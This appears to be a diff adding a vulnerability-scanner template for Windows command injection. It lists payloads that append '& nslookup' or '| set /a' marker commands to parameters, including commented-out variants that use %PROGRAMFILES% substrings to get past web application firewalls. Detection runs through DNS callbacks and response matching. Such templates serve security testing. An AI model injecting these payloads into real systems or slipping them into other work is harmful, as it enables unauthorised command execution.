@@ -1,0 +1,66 @@
+generate:
+  - payload:
+#For QUICK scan profile. DNS_MARKER & CALC_MARKER.
+    - "& nslookup DNS_MARKER &"
+    - "'& nslookup DNS_MARKER'"
+    - "\"& nslookup DNS_MARKER\""
+    - "| nslookup DNS_MARKER"
+    - "'| nslookup DNS_MARKER'"
+    - "\"| nslookup DNS_MARKER\""
+    - "& set /a CALC_MARKER &"
+    - "'& set /a CALC_MARKER'"
+    - "\"& set /a CALC_MARKER\""
+    - "| set /a CALC_MARKER"
+    - "'| set /a CALC_MARKER'"
+    - "\"| set /a CALC_MARKER\""
+
+#For INTENSIVE scan profile. May be useful for the limited size of the parameter or WAF bypass.
+# DNS_MARKER
+    # - "& nslookup DNS_MARKER &"
+    # - "&%PROGRAMFILES:~10,-5%nslookup%PROGRAMFILES:~10,-5%DNS_MARKER%PROGRAMFILES:~10,-5%&"
+    # - "'& nslookup DNS_MARKER'"
+    # - "'&%PROGRAMFILES:~10,-5%nslookup%PROGRAMFILES:~10,-5%DNS_MARKER'"
+    # - "\"& nslookup DNS_MARKER\""
+    # - "\"&%PROGRAMFILES:~10,-5%nslookup%PROGRAMFILES:~10,-5%DNS_MARKER\""
+    # - "| nslookup DNS_MARKER"
+    # - "|%PROGRAMFILES:~10,-5%nslookup%PROGRAMFILES:~10,-5%DNS_MARKER"
+    # - "'| nslookup DNS_MARKER'"
+    # - "'|%PROGRAMFILES:~10,-5%nslookup%PROGRAMFILES:~10,-5%DNS_MARKER'"
+    # - "\"| nslookup DNS_MARKER\""
+    # - "\"|%PROGRAMFILES:~10,-5%nslookup%PROGRAMFILES:~10,-5%DNS_MARKER\""
+#CALC_MARKER
+    # - "& set /a CALC_MARKER &"
+    # - "&%PROGRAMFILES:~10,-5%set%PROGRAMFILES:~10,-5%/a%PROGRAMFILES:~10,-5%CALC_MARKER%PROGRAMFILES:~10,-5%&"
+    # - "'&set /a CALC_MARKER'"
+    # - "'&%PROGRAMFILES:~10,-5%set%PROGRAMFILES:~10,-5%/a%PROGRAMFILES:~10,-5%CALC_MARKER'"
+    # - "\"& set /a CALC_MARKER\""
+    # - "\"&%PROGRAMFILES:~10,-5%set%PROGRAMFILES:~10,-5%/a%PROGRAMFILES:~10,-5%CALC_MARKER\""
+    # - "| set /a CALC_MARKER"
+    # - "|%PROGRAMFILES:~10,-5%set%PROGRAMFILES:~10,-5%/a%PROGRAMFILES:~10,-5%CALC_MARKER"
+    # - "'| set /a CALC_MARKER'"
+    # - "'|%PROGRAMFILES:~10,-5%set%PROGRAMFILES:~10,-5%/a%PROGRAMFILES:~10,-5%CALC_MARKER'"
+    # - "\"| set /a CALC_MARKER\""
+    # - "\"|%PROGRAMFILES:~10,-5%set%PROGRAMFILES:~10,-5%/a%PROGRAMFILES:~10,-5%CALC_MARKER\""
+
+  - method:
+    - postfix
+    - replace
+
+detect:
+  - oob:
+    - dns
+  - response:
+    - body: CALC_MARKER
+
+meta-info:
+  - type: rce
+  - threat: 95
+  - tags:
+    - OS Commanding
+    - RCE
+    - Remote Code Execution
+    - Shell injection
+    - Command injection
+    - OWASP Top 10
+    - OWASP
+    - Windows command injection
